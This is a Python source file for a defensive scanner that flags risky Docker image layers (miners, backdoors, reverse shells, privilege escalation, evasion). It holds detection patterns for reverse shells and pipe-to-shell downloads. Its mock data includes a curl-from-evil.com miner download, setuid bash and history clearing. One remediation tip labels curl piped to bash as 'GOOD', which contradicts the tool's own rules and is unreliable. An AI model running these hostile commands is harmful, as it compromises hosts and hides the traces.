#!/usr/bin/env python3
"""
Enhanced Behavioral Analyzer - Layer-by-Layer Docker Security Analysis
Integrates with extract.py and model.py for ML-based threat detection
"""

import json
import re
import math
import logging
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, field
from collections import Counter, defaultdict
import hashlib

logger = logging.getLogger(__name__)


@dataclass
class LayerAnalysis:
    """Analysis results for a single Docker layer"""
    layer_id: str
    command: str
    size_bytes: int
    created: str
    risk_score: float = 0.0
    findings: List[str] = field(default_factory=list)
    threat_indicators: Dict[str, float] = field(default_factory=dict)


@dataclass  
class RemediationSuggestion:
    """Actionable remediation for detected issues"""
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    issue: str
    layer_id: str
    remediation: str
    example_fix: Optional[str] = None


class BehavioralAnalyzer:
    """
    Layer-by-layer behavioral analysis that goes beyond CVE scanning
    This is YOUR unique contribution - temporal attack pattern detection
    """
    
    def __init__(self):
        # ============================================
        # ENHANCED CRYPTOMINER DETECTION
        # ============================================
        
        # Binary patterns (beyond just filenames)
        self.miner_indicators = {
            'binary_names': [
                'xmrig', 'cgminer', 'ethminer', 'claymore', 'gminer', 'lolminer',
                't-rex', 'nanominer', 'phoenixminer', 'nbminer', 'teamredminer',
                'kawpowminer', 'trex', 'minerd', 'cpuminer', 'bfgminer', 'ccminer',
                'cryptonight', 'randomx', 'xmr-stak', 'nicehash'
            ],
            
            # Command patterns (runtime downloads)
            'download_patterns': [
                r'curl.*\.sh.*bash',
                r'wget.*\.sh.*sh',
                r'curl.*http[s]?://.*\|',
                r'fetch.*\|\s*bash',
                r'github\.com.*releases.*download',
            ],
            
            # Mining-specific commands
            'mining_commands': [
                r'-o\s+pool\.',
                r'-u\s+\w+\.\w+',  # username.worker format
                r'--donate-level',
                r'--algo\s+',
                r'stratum\+tcp',
                r'--coin\s+',
            ],
            
            # Suspicious compilation
            'compile_patterns': [
                r'gcc.*-o.*miner',
                r'make.*xmrig',
                r'cmake.*crypto',
            ]
        }
        
        # Pool detection (domain patterns, not just hardcoded URLs)
        self.pool_patterns = [
            r'pool\.\w+\.(com|org|net)',
            r'\w+pool\.(com|org|net)',
            r'mining\.\w+\.',
            r'stratum\+tcp://.*:\d+',
            r'nanopool', r'ethermine', r'f2pool', r'2miners',
            r'minexmr', r'supportxmr', r'moneroocean',
            r'nicehash', r'slushpool', r'antpool',
        ]
        
        # ============================================
        # BACKDOOR DETECTION
        # ============================================
        
        self.backdoor_patterns = {
            'ssh_indicators': [
                r'apt-get.*install.*openssh-server',
                r'yum.*install.*openssh-server',
                r'apk.*add.*openssh',
                r'systemctl.*enable.*sshd',
                r'service\s+ssh\s+start',
                r'/etc/ssh/sshd_config',
                r'PasswordAuthentication\s+yes',
                r'PermitRootLogin\s+yes',
            ],
            
            'reverse_shell': [
                r'nc\s+-.*-e\s+/bin/',
                r'bash\s+-i.*>&',
                r'/dev/tcp/\d+\.\d+',
                r'python.*socket.*connect',
                r'perl.*socket.*connect',
            ],
            
            'persistence': [
                r'crontab.*-',
                r'@reboot',
                r'systemctl.*enable',
                r'/etc/rc\.local',
                r'\.bashrc.*echo',
                r'\.profile.*curl',
            ]
        }
        
        # ============================================
        # PRIVILEGE ESCALATION
        # ============================================
        
        self.privilege_patterns = [
            r'chmod\s+[u+]?s\s+',  # setuid
            r'chmod\s+4755',
            r'chown\s+root:root',
            r'sudo\s+',
            r'su\s+-',
            r'passwd\s+root',
            r'usermod.*-aG.*sudo',
            r'visudo',
        ]
        
        # ============================================
        # EVASION TACTICS
        # ============================================
        
        self.evasion_patterns = {
            'obfuscation': [
                r'base64.*decode',
                r'echo.*\|.*base64',
                r'eval.*\$\(',
                r'\\x[0-9a-f]{2}',  # hex encoding
            ],
            
            'anti_forensics': [
                r'history\s+-c',
                r'unset\s+HISTFILE',
                r'rm.*\.bash_history',
                r'>/dev/null\s+2>&1',
            ],
            
            'file_hiding': [
                r'mv\s+\w+\s+\.',  # rename to hidden
                r'touch\s+-r',  # timestamp manipulation
                r'chattr\s+\+i',  # immutable attribute
            ]
        }
        
        # ============================================
        # TEMPORAL ANOMALY DETECTION
        # ============================================
        
        self.temporal_patterns = {
            'download_delete': [
                # Pattern: download then delete
                r'(curl|wget|fetch).*&&.*rm\s+-',
                r'(curl|wget).*;\s*rm\s+',
            ],
            
            'create_execute_delete': [
                # Pattern: create, execute, remove
                r'(ADD|COPY).*&&.*chmod.*&&.*\./',
                r'echo.*>.*&&.*chmod.*&&.*rm',
            ]
        }
    
    def analyze_image(self, image_name: str, trivy_data: Dict, syft_data: Dict) -> Dict[str, float]:
        """
        Main entry point - matches extract.py's expected signature
        Returns features that map to your ML model's column order
        """
        
        # Extract layer data from Trivy
        metadata = trivy_data.get('Metadata', {})
        image_config = metadata.get('ImageConfig', {})
        history = image_config.get('history', [])
        
        if not history:
            logger.warning(f"No layer history found for {image_name}")
            return self._empty_features()
        
        logger.info(f"Analyzing {len(history)} layers for {image_name}")
        
        # Analyze each layer
        layer_analyses = []
        for idx, layer in enumerate(history):
            analysis = self._analyze_layer(idx, layer)
            layer_analyses.append(analysis)
        
        # Generate remediations (stored for later use)
        remediations = self._generate_remediations(layer_analyses)
        
        # Extract ML features from layer analysis
        features = self._extract_ml_features(layer_analyses, trivy_data, syft_data)
        
        # Store remediations for reporting (hacky but works)
        # The DockerSecurityScanner will pick this up
        features['_remediations'] = remediations  # Won't be in CSV
        
        return features
    
    def _analyze_layer(self, idx: int, layer: Dict) -> LayerAnalysis:
        """
        Analyze a single layer for behavioral patterns
        This is where the magic happens - temporal analysis
        """
        
        command = layer.get('created_by', '')
        size = layer.get('size', 0)
        created = layer.get('created', '')
        
        analysis = LayerAnalysis(
            layer_id=f"layer_{idx}",
            command=command,
            size_bytes=size,
            created=created
        )
        
        risk_score = 0.0
        
        # ============================================
        # 1. CRYPTOMINER DETECTION (Enhanced)
        # ============================================
        
        miner_score = 0.0
        
        # Binary names
        for binary in self.miner_indicators['binary_names']:
            if binary in command.lower():
                miner_score += 0.4
                analysis.findings.append(f"Cryptominer binary: {binary}")
                analysis.threat_indicators['cryptominer_binary'] = 1.0
                break
        
        # Download patterns
        for pattern in self.miner_indicators['download_patterns']:
            if re.search(pattern, command, re.IGNORECASE):
                miner_score += 0.3
                analysis.findings.append("Suspicious download-execute pattern")
                analysis.threat_indicators['download_execute'] = 1.0
                break
        
        # Mining commands
        mining_cmd_count = 0
        for pattern in self.miner_indicators['mining_commands']:
            if re.search(pattern, command, re.IGNORECASE):
                mining_cmd_count += 1
        
        if mining_cmd_count >= 2:
            miner_score += 0.5
            analysis.findings.append(f"Mining command pattern detected ({mining_cmd_count} indicators)")
            analysis.threat_indicators['mining_commands'] = mining_cmd_count / 3.0
        
        # ============================================
        # 2. MINING POOL DETECTION (Enhanced)
        # ============================================
        
        pool_score = 0.0
        for pattern in self.pool_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                pool_score += 0.4
                analysis.findings.append(f"Mining pool pattern detected")
                analysis.threat_indicators['mining_pool'] = 1.0
                break
        
        # ============================================
        # 3. SSH BACKDOOR DETECTION
        # ============================================
        
        ssh_score = 0.0
        for pattern in self.backdoor_patterns['ssh_indicators']:
            if re.search(pattern, command, re.IGNORECASE):
                ssh_score += 0.3
                analysis.findings.append("SSH server installation detected")
                analysis.threat_indicators['ssh_backdoor'] = 1.0
                break
        
        for pattern in self.backdoor_patterns['reverse_shell']:
            if re.search(pattern, command, re.IGNORECASE):
                ssh_score += 0.5
                analysis.findings.append("Reverse shell pattern detected")
                analysis.threat_indicators['reverse_shell'] = 1.0
                break
        
        # ============================================
        # 4. PRIVILEGE ESCALATION
        # ============================================
        
        priv_score = 0.0
        for pattern in self.privilege_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                priv_score += 0.3
                analysis.findings.append("Privilege escalation pattern detected")
                analysis.threat_indicators['privilege_escalation'] = 1.0
                break
        
        # ============================================
        # 5. TEMPORAL ANOMALIES
        # ============================================
        
        temporal_score = 0.0
        
        # Download-delete pattern
        for pattern in self.temporal_patterns['download_delete']:
            if re.search(pattern, command, re.IGNORECASE):
                temporal_score += 0.4
                analysis.findings.append("Download-then-delete pattern (evasion tactic)")
                analysis.threat_indicators['temporal_anomaly'] = 1.0
                break
        
        # Large layer spike
        if size > 100 * 1024 * 1024:  # >100MB
            temporal_score += 0.2
            analysis.findings.append(f"Large layer: {size / (1024*1024):.1f}MB")
            analysis.threat_indicators['large_layer'] = size / (200 * 1024 * 1024)  # Normalized
        
        # ============================================
        # 6. EVASION TACTICS
        # ============================================
        
        evasion_score = 0.0
        
        for pattern in self.evasion_patterns['obfuscation']:
            if re.search(pattern, command, re.IGNORECASE):
                evasion_score += 0.3
                analysis.findings.append("Obfuscation detected")
                analysis.threat_indicators['obfuscation'] = 1.0
                break
        
        for pattern in self.evasion_patterns['anti_forensics']:
            if re.search(pattern, command, re.IGNORECASE):
                evasion_score += 0.2
                analysis.findings.append("Anti-forensics pattern detected")
                analysis.threat_indicators['anti_forensics'] = 1.0
                break
        
        # ============================================
        # 7. PROCESS INJECTION INDICATORS
        # ============================================
        
        injection_patterns = [
            r'ptrace',
            r'LD_PRELOAD',
            r'/proc/.*mem',
            r'gdb.*attach',
        ]
        
        for pattern in injection_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                evasion_score += 0.3
                analysis.findings.append("Process injection indicator")
                analysis.threat_indicators['process_injection'] = 1.0
                break
        
        # ============================================
        # 8. SUSPICIOUS PATHS
        # ============================================
        
        suspicious_paths = ['/tmp/', '/var/tmp/', '/dev/shm/', '/.hidden']
        path_count = sum(1 for path in suspicious_paths if path in command)
        
        if path_count > 0:
            evasion_score += 0.15 * path_count
            analysis.findings.append(f"Suspicious path usage ({path_count} instances)")
            analysis.threat_indicators['suspicious_paths'] = path_count / 4.0
        
        # ============================================
        # 9. COMMAND ENTROPY (Obfuscation)
        # ============================================
        
        entropy = self._calculate_entropy(command)
        if entropy > 4.5:
            evasion_score += 0.2
            analysis.findings.append(f"High command entropy: {entropy:.2f}")
            analysis.threat_indicators['high_entropy'] = (entropy - 4.0) / 4.0  # Normalized
        
        # ============================================
        # AGGREGATE RISK SCORE
        # ============================================
        
        risk_score = min(
            miner_score + pool_score + ssh_score + priv_score + temporal_score + evasion_score,
            1.0
        )
        
        analysis.risk_score = risk_score
        
        return analysis
    
    def _extract_ml_features(self, layer_analyses: List[LayerAnalysis], 
                            trivy_data: Dict, syft_data: Dict) -> Dict[str, float]:
        """
        Extract features that match your ML model's column order
        Maps layer analysis to model features
        """
        
        features = {}
        
        # Aggregate threat indicators across all layers
        all_indicators = defaultdict(float)
        for analysis in layer_analyses:
            for indicator, value in analysis.threat_indicators.items():
                all_indicators[indicator] = max(all_indicators[indicator], value)
        
        # ============================================
        # MAP TO MODEL FEATURES
        # ============================================
        
        # 1. cryptominer_binary - ENHANCED
        features['cryptominer_binary'] = 1 if all_indicators.get('cryptominer_binary', 0) > 0 else 0
        if all_indicators.get('mining_commands', 0) > 0.5:
            features['cryptominer_binary'] = 1
        
        # 2. mining_pools - ENHANCED
        features['mining_pools'] = 1 if all_indicators.get('mining_pool', 0) > 0 else 0
        
        # 3. ssh_backdoor - ENHANCED
        features['ssh_backdoor'] = 1 if (
            all_indicators.get('ssh_backdoor', 0) > 0 or 
            all_indicators.get('reverse_shell', 0) > 0
        ) else 0
        
        # 4. Layer-based features
        features['layer_deletion_score'] = all_indicators.get('temporal_anomaly', 0.0)
        features['temp_file_activity'] = all_indicators.get('suspicious_paths', 0.0)
        features['process_injection_risk'] = all_indicators.get('process_injection', 0.0)
        features['privilege_escalation_risk'] = all_indicators.get('privilege_escalation', 0.0)
        features['anti_analysis_score'] = max(
            all_indicators.get('obfuscation', 0.0),
            all_indicators.get('anti_forensics', 0.0)
        )
        
        # 5. Entropy features
        features['avg_file_entropy'] = all_indicators.get('high_entropy', 0.0)
        features['high_entropy_ratio'] = all_indicators.get('high_entropy', 0.0)
        
        # 6. Crypto mining behavior (composite)
        mining_indicators = [
            all_indicators.get('cryptominer_binary', 0),
            all_indicators.get('mining_pool', 0),
            all_indicators.get('mining_commands', 0),
            all_indicators.get('download_execute', 0),
        ]
        features['crypto_mining_behavior'] = sum(mining_indicators) / len(mining_indicators)
        
        # 7. Advanced behavioral features
        features['stratum_indicators'] = 1 if 'stratum' in str(trivy_data).lower() else 0
        
        # Raw IP connections (from layer commands)
        ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        ip_count = 0
        for analysis in layer_analyses:
            ip_count += len(re.findall(ip_pattern, analysis.command))
        features['raw_ip_connections'] = min(ip_count, 5) / 5.0  # Normalized
        
        # Suspicious DNS queries (domain patterns)
        suspicious_domains = ['tk', 'ml', 'ga', 'cf', 'gq']  # Free TLDs
        domain_count = sum(
            1 for analysis in layer_analyses
            for tld in suspicious_domains
            if f'.{tld}' in analysis.command.lower()
        )
        features['suspicious_dns_queries'] = min(domain_count, 3) / 3.0
        
        # 8. Binary analysis from SBOM
        if syft_data:
            artifacts = syft_data.get('artifacts', [])
            total_binaries = sum(1 for a in artifacts if a.get('type') == 'binary')
            
            if total_binaries > 0:
                # Stripped binaries detection
                stripped_count = sum(
                    1 for a in artifacts 
                    if a.get('type') == 'binary' and 'stripped' in str(a).lower()
                )
                features['stripped_binaries_ratio'] = stripped_count / total_binaries
                
                # Packed binaries (UPX, etc.)
                packed_count = sum(
                    1 for a in artifacts
                    if any(packer in str(a).lower() for packer in ['upx', 'packed', 'compressed'])
                )
                features['packed_binary_score'] = packed_count / max(total_binaries, 1)
            else:
                features['stripped_binaries_ratio'] = 0.0
                features['packed_binary_score'] = 0.0
        else:
            features['stripped_binaries_ratio'] = 0.0
            features['packed_binary_score'] = 0.0
        
        # 9. External calls (from layer commands)
        external_indicators = ['curl', 'wget', 'fetch', 'http://', 'https://']
        external_count = sum(
            1 for analysis in layer_analyses
            for indicator in external_indicators
            if indicator in analysis.command.lower()
        )
        features['external_calls'] = min(external_count, 10)
        
        logger.info(f"Extracted behavioral features: crypto_mining={features['crypto_mining_behavior']:.3f}, "
                   f"priv_esc={features['privilege_escalation_risk']:.3f}")
        
        return features
    
    def _calculate_entropy(self, text: str) -> float:
        """Calculate Shannon entropy"""
        if not text:
            return 0.0
        
        char_counts = Counter(text)
        length = len(text)
        
        entropy = 0.0
        for count in char_counts.values():
            if count > 0:
                prob = count / length
                entropy -= prob * math.log2(prob)
        
        return entropy
    
    def _generate_remediations(self, layer_analyses: List[LayerAnalysis]) -> List[RemediationSuggestion]:
        """Generate actionable remediation suggestions"""
        
        remediations = []
        
        for analysis in layer_analyses:
            if analysis.risk_score < 0.3:
                continue
            
            # Determine severity
            if analysis.risk_score >= 0.7:
                severity = "CRITICAL"
            elif analysis.risk_score >= 0.5:
                severity = "HIGH"
            elif analysis.risk_score >= 0.3:
                severity = "MEDIUM"
            else:
                severity = "LOW"
            
            # Generate remediations for each finding
            for finding in analysis.findings:
                remediation_text, example = self._get_remediation(finding, analysis.command)
                
                rem = RemediationSuggestion(
                    severity=severity,
                    issue=finding,
                    layer_id=analysis.layer_id,
                    remediation=remediation_text,
                    example_fix=example
                )
                
                remediations.append(rem)
        
        # Sort by severity
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        remediations.sort(key=lambda r: severity_order.get(r.severity, 4))
        
        return remediations
    
    def _get_remediation(self, finding: str, command: str) -> Tuple[str, Optional[str]]:
        """Get remediation text and example fix for a finding"""
        
        finding_lower = finding.lower()
        
        if 'cryptominer' in finding_lower or 'mining' in finding_lower:
            return (
                "Remove cryptomining software. Containers should not mine cryptocurrency.",
                "# Remove the mining software installation\n"
                "# Review all RUN commands that download/install binaries\n"
                "# Use only official packages from trusted repositories"
            )
        
        elif 'download-execute' in finding_lower or 'download-then-delete' in finding_lower:
            return (
                "Never pipe downloads directly to shell. Use multi-stage builds instead.",
                "# BAD:\n"
                "RUN curl http://site.com/install.sh | bash\n\n"
                "# GOOD:\n"
                "COPY install.sh /tmp/\n"
                "RUN chmod +x /tmp/install.sh && /tmp/install.sh"
            )
        
        elif 'ssh' in finding_lower or 'backdoor' in finding_lower:
            return (
                "Remove SSH server from container. Use 'docker exec' for debugging instead.",
                "# Remove SSH installation\n"
                "# For debugging, use: docker exec -it <container> /bin/bash"
            )
        
        elif 'privilege escalation' in finding_lower:
            return (
                "Avoid setuid binaries and sudo. Run as non-root user.",
                "# Add non-root user\n"
                "RUN useradd -m -s /bin/bash appuser\n"
                "USER appuser"
            )
        
        elif 'temporal anomaly' in finding_lower or 'deletion' in finding_lower:
            return (
                "Use multi-stage builds instead of deleting files in layers.",
                "# Multi-stage build example:\n"
                "FROM alpine AS builder\n"
                "RUN apk add --no-cache build-tools\n"
                "COPY . /build\n"
                "RUN make\n\n"
                "FROM alpine\n"
                "COPY --from=builder /build/app /app"
            )
        
        elif 'obfuscation' in finding_lower or 'entropy' in finding_lower:
            return (
                "Commands should be readable. Avoid base64 encoding and eval.",
                "# BAD:\n"
                "RUN echo 'Y3VybCBldmlsLmNvbQ==' | base64 -d | bash\n\n"
                "# GOOD:\n"
                "RUN curl -fsSL official-site.com/install.sh | bash"
            )
        
        elif 'suspicious path' in finding_lower:
            return (
                "Avoid using /tmp, /var/tmp, /dev/shm. Use proper working directories.",
                "# Set proper working directory\n"
                "WORKDIR /app\n"
                "# Use /app instead of /tmp for temporary files"
            )
        
        elif 'reverse shell' in finding_lower:
            return (
                "Remove reverse shell commands. These are indicators of malicious activity.",
                "# Review layer history and remove any nc, bash, or socket connections"
            )
        
        elif 'anti-forensics' in finding_lower:
            return (
                "Do not clear history or hide logs. Containers should be transparent.",
                "# Remove commands like:\n"
                "# - history -c\n"
                "# - unset HISTFILE\n"
                "# - rm .bash_history"
            )
        
        else:
            return (
                "Review layer for security issues and follow Docker best practices.",
                "# See: https://docs.docker.com/develop/dev-best-practices/"
            )
    
    def _empty_features(self) -> Dict[str, float]:
        """Return empty features when analysis fails"""
        return {
            'cryptominer_binary': 0,
            'mining_pools': 0,
            'ssh_backdoor': 0,
            'layer_deletion_score': 0.0,
            'temp_file_activity': 0.0,
            'process_injection_risk': 0.0,
            'privilege_escalation_risk': 0.0,
            'anti_analysis_score': 0.0,
            'avg_file_entropy': 0.0,
            'high_entropy_ratio': 0.0,
            'crypto_mining_behavior': 0.0,
            'stratum_indicators': 0,
            'raw_ip_connections': 0.0,
            'suspicious_dns_queries': 0.0,
            'stripped_binaries_ratio': 0.0,
            'packed_binary_score': 0.0,
            'external_calls': 0,
        }


def print_layer_analysis_report(layer_analyses: List[LayerAnalysis], 
                                remediations: List[RemediationSuggestion],
                                image_name: str):
    """Pretty print layer analysis report"""
    
    print("\n" + "="*80)
    print(f"LAYER-BY-LAYER BEHAVIORAL ANALYSIS: {image_name}")
    print("="*80)
    
    # Calculate overall risk
    if not layer_analyses:
        print("\n⚪ No layer data available")
        return
    
    max_risk = max(la.risk_score for la in layer_analyses)
    avg_risk = sum(la.risk_score for la in layer_analyses) / len(layer_analyses)
    high_risk_count = sum(1 for la in layer_analyses if la.risk_score > 0.5)
    
    overall_score = (max_risk * 0.5) + (avg_risk * 0.3) + (high_risk_count / len(layer_analyses) * 0.2)
    
    if overall_score >= 0.7:
        level = 'CRITICAL'
        emoji = '🔴'
    elif overall_score >= 0.5:
        level = 'HIGH'
        emoji = '🟠'
    elif overall_score >= 0.3:
        level = 'MEDIUM'
        emoji = '🟡'
    else:
        level = 'LOW'
        emoji = '🟢'
    
    print(f"\n{emoji} OVERALL RISK: {level}")
    print(f"   Risk Score: {overall_score:.1%}")
    print(f"   High-Risk Layers: {high_risk_count}/{len(layer_analyses)}")
    print(f"   Max Layer Risk: {max_risk:.1%}")
    
    # Layer-by-Layer Details
    print(f"\n{'─'*80}")
    print("HIGH-RISK LAYERS")
    print(f"{'─'*80}")
    
    high_risk_layers = [la for la in layer_analyses if la.risk_score >= 0.3]
    
    if high_risk_layers:
        for analysis in high_risk_layers[:10]:  # Show top 10
            risk_emoji = "🔴" if analysis.risk_score >= 0.7 else "🟠" if analysis.risk_score >= 0.5 else "🟡"
            
            print(f"\n{risk_emoji} {analysis.layer_id.upper()} (Risk: {analysis.risk_score:.1%})")
            print(f"   Command: {analysis.command[:100]}...")
            
            if analysis.findings:
                print(f"   Findings:")
                for finding in analysis.findings[:5]:  # Top 5 per layer
                    print(f"      • {finding}")
    else:
        print("\n✓ No high-risk layers detected")
    
    # Remediation Suggestions
    if remediations:
        print(f"\n{'─'*80}")
        print("🔧 REMEDIATION RECOMMENDATIONS")
        print(f"{'─'*80}")
        
        # Group by severity
        critical = [r for r in remediations if r.severity == "CRITICAL"]
        high = [r for r in remediations if r.severity == "HIGH"]
        medium = [r for r in remediations if r.severity == "MEDIUM"]
        
        for severity, items in [("CRITICAL", critical), ("HIGH", high), ("MEDIUM", medium)]:
            if not items:
                continue
            
            icon = "🔴" if severity == "CRITICAL" else "🟠" if severity == "HIGH" else "🟡"
            print(f"\n{icon} {severity} PRIORITY ({len(items)} issues)")
            
            for idx, rem in enumerate(items[:3], 1):  # Show top 3 per severity
                print(f"\n   {idx}. {rem.issue}")
                print(f"      Fix: {rem.remediation}")
                
                if rem.example_fix:
                    print(f"      Example:")
                    for line in rem.example_fix.split('\n'):
                        if line.strip():
                            print(f"         {line}")
            
            if len(items) > 3:
                print(f"\n   ... and {len(items) - 3} more {severity} issues")
    
    print("\n" + "="*80)


# Standalone testing
if __name__ == "__main__":
    # Test with mock data
    mock_trivy_data = {
        "Metadata": {
            "ImageConfig": {
                "history": [
                    {
                        "created": "2024-01-01T00:00:00Z",
                        "created_by": "FROM alpine:latest",
                        "size": 5000000
                    },
                    {
                        "created": "2024-01-01T00:01:00Z",
                        "created_by": "RUN curl http://evil.com/xmrig.tar.gz | tar xz && ./xmrig -o pool.minexmr.com:4444",
                        "size": 150000000
                    },
                    {
                        "created": "2024-01-01T00:02:00Z",
                        "created_by": "RUN rm -rf /tmp/xmrig.tar.gz",
                        "size": 1000
                    },
                    {
                        "created": "2024-01-01T00:03:00Z",
                        "created_by": "RUN apt-get install -y openssh-server && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config",
                        "size": 50000000
                    },
                    {
                        "created": "2024-01-01T00:04:00Z",
                        "created_by": "RUN chmod u+s /bin/bash && history -c",
                        "size": 5000
                    }
                ]
            }
        }
    }
    
    mock_syft_data = {
        "artifacts": [
            {"name": "xmrig", "type": "binary"},
            {"name": "openssh-server", "type": "package"},
        ]
    }
    
    analyzer = BehavioralAnalyzer()
    features = analyzer.analyze_image("suspicious:latest", mock_trivy_data, mock_syft_data)
    
    print("\n" + "="*80)
    print("BEHAVIORAL FEATURES EXTRACTED")
    print("="*80)
    for feature, value in features.items():
        if not feature.startswith('_'):
            print(f"  {feature:35s}: {value}")
    
    # Get remediations
    remediations = features.get('_remediations', [])
    
    print(f"\n{len(remediations)} remediations generated")
    
    if remediations:
        print("\nTop 3 Critical Issues:")
        for i, rem in enumerate(remediations[:3], 1):
            print(f"\n{i}. {rem.severity}: {rem.issue}")
            print(f"   Fix: {rem.remediation}")